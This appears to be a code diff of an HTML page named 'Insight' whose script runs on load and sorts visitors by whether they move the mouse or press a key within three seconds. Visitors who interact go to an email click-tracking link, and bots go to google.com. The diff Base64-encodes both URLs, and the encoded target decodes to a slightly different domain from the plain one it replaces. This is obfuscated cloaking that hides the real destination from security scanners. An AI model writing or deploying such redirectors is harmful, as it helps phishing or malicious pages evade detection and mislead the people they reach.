@@ -6,36 +6,43 @@
   <title>Insight</title>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
+      const timeoutDuration = 3000; // Timeout duration in milliseconds
+      const mainUrl = "aHR0cHM6Ly9zZW1pLXpjbXAuYWlsbGlzdC1tYW5hZ2UuY29tL2NsaWNrLzExMzRkMWI2OTg4NTQ2MmRmLzExMzRkMWI2OTg4NTQ1ZjI3";
+      const botUrl = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";
+
+      // Decode Base64 URLs
+      const decodeUrl = (encodedUrl) => atob(encodedUrl);
+
       const isHuman = () => {
-        // Check for mouse or keyboard interaction
         return new Promise((resolve) => {
           let interacted = false;
 
           const interactionListener = () => {
             interacted = true;
             resolve(true);
+            // Clean up event listeners
             window.removeEventListener("mousemove", interactionListener);
             window.removeEventListener("keydown", interactionListener);
           };
 
+          // Attach listeners for human interaction
           window.addEventListener("mousemove", interactionListener);
           window.addEventListener("keydown", interactionListener);
 
-          // Timeout to decide if no interaction means bot
+          // Fallback to bot if no interaction is detected within the timeout
           setTimeout(() => {
             if (!interacted) resolve(false);
-          }, 3000);
+          }, timeoutDuration);
         });
       };
 
+      // Determine user type and redirect
       isHuman().then((human) => {
-        if (human) {
-          // Redirect human users to the main page
-          window.location.href = "https://semi-zcmp.maillist-manage.com/click/1134d1b69885462df/1134d1b6988545f27";
-        } else {
-          // Redirect bots or non-interactive visitors to another URL
-          window.location.href = "https://www.google.com";
-        }
+        const targetUrl = human ? decodeUrl(mainUrl) : decodeUrl(botUrl);
+        window.location.href = targetUrl;
+      }).catch((err) => {
+        console.error("Error determining user type:", err);
+        window.location.href = decodeUrl(botUrl); // Fallback to bot URL
       });
     });
   </script>
